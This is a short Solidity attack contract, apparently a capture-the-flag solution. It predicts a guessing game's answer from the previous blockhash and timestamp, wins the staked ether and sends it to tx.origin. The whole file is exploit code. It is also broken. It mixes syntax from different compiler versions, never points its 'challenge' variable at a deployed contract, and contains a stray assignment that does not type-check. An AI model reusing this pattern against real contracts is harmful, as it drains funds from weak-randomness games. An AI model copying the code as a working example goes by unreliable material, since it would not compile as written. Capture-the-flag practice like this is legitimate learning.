pragma solidity ^0.4.21;

import './GuessTheNewNumber.sol';

contract GuessTheNewNumberAttack {
    
    function attack() public payable {
        GuessTheNewNumberChallenge challenge;

        require(address(this).balance >= 1 ether);
        uint8 answer = uint8(uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ));
        bytes32 a = abi.encode('aaa');
        challenge.guess{value: 1 ether}(answer);
        
        require(challenge.isComplete(), "challenge not completed");
        tx.origin.transfer(address(this).balance);
    }
}